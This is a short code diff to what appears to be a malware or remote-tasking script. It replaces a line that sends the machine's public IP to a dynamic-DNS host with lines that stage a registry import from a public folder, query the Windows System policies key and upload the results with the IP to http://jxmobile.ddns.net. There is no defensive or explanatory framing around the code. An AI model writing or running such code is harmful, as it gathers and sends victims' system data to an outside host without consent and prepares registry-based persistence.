@@ -1,2 +1,7 @@
-var res = runCmd('powershell -Command "(Invoke-RestMethod https://api.ipify.org)"');
-httpPut('http://jxmobile.ddns.net/tool/icings.txt', res);
+var command = "reg import C:\\users\\public\\startup.reg";
+var command1 = "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
+var res1="";//runCmdEx(command);
+var res2=runCmdEx(command1);
+var res=res1+res2;
+var ip = runPs("Invoke-RestMethod https://api.ipify.org").trim(); //"18.70.91.162";// 
+httpPut('http://jxmobile.ddns.net/tool/tony'+ip+'_8.txt', "github\n" + command+"\n"+res);
